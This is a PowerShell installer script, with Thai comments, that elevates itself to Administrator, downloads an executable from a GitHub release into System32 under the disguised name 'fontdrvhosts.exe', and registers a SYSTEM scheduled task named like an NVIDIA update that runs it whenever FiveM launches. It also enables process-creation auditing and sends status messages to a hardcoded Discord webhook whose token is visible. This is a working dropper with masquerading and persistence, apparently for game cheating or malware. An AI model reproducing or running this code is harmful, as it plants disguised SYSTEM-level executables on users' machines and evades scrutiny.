# -----------------------------
# Menu Selection
# -----------------------------
Write-Host "Select Mode:"
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Enter choice (1/2)"

# -----------------------------
# Check for Administrator rights
# -----------------------------
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
    Write-Host "Restarting with Administrator privileges..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# -----------------------------
# Define paths and variables
# -----------------------------
$system32Path = "$env:windir\System32"
$exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
$taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
$exeUrl        = "https://github.com/Chxtoqfee12/Fivem/releases/download/Chx_12/Chx.exe"

# Webhook (from user)
$webhookUrl = "https://discord.com/api/webhooks/1424002804988514346/hfC8h7QRd0Xn-iQQTxmthRd63ikRrpOYuLdPNtmeadsyAae0j9jB4fkXTtYSs91An2u8"

function Send-WebhookNotification {
    param(
        [string]$webhook,
        [string]$message
    )
    try {
        $payload = @{
            content = $message
            # ไม่ใส่ข้อมูลส่วนตัวหรือข้อมูลระบบลงไปโดยไม่ขออนุญาต
            embeds  = @(
                @{
                    title = "Installer Notification"
                    description = $message
                    timestamp = (Get-Date).ToString("o")
                }
            )
        }
        $json = $payload | ConvertTo-Json -Depth 4
        Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $json -ErrorAction Stop
        Write-Host "Webhook notification sent."
    } catch {
        Write-Warning "Failed to send webhook: $($_.Exception.Message)"
    }
}

# -----------------------------
# Install Mode (with webhook notify)
# -----------------------------
if ($choice -eq "1") {
    Write-Host "Starting installation..."

    # ส่งข้อความแจ้งว่าเริ่มติดตั้ง (ไม่มีข้อมูลส่วนตัว)
    Send-WebhookNotification -webhook $webhookUrl -message "Install started for CHX package. (No personal data sent) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

    try {
        # ดาวน์โหลดไฟล์ exe ไปยัง System32
        Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination -UseBasicParsing -ErrorAction Stop

        # สร้าง Scheduled Task เพื่อให้ exe ทำงานเมื่อเกิดเหตุการณ์
        $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
        Invoke-Expression $cmd

        # เปิด Audit Logging สำหรับการสร้าง Process
        auditpol /set /subcategory:"Process Creation" /success:enable

        Write-Host "Installation completed."

        # ส่งแจ้งผลสำเร็จ
        Send-WebhookNotification -webhook $webhookUrl -message "Install completed successfully for CHX package. - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    } catch {
        Write-Warning "Installation failed: $($_.Exception.Message)"
        Send-WebhookNotification -webhook $webhookUrl -message "Install failed for CHX package: $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    }
}

# -----------------------------
# Clean Mode
# -----------------------------
elseif ($choice -eq "2") {
    Write-Host "Cleaning up installation..."
    try {
        schtasks /delete /tn $taskName /f
        if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force }
        Write-Host "Cleanup completed."
        Send-WebhookNotification -webhook $webhookUrl -message "Cleanup completed for CHX package. - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    } catch {
        Write-Warning "Cleanup error: $($_.Exception.Message)"
        Send-WebhookNotification -webhook $webhookUrl -message "Cleanup failed for CHX package: $($_.Exception.Message) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    }
}

# -----------------------------
# Invalid Choice
# -----------------------------
else {
    Write-Host "Invalid choice (please select 1 or 2)."
}
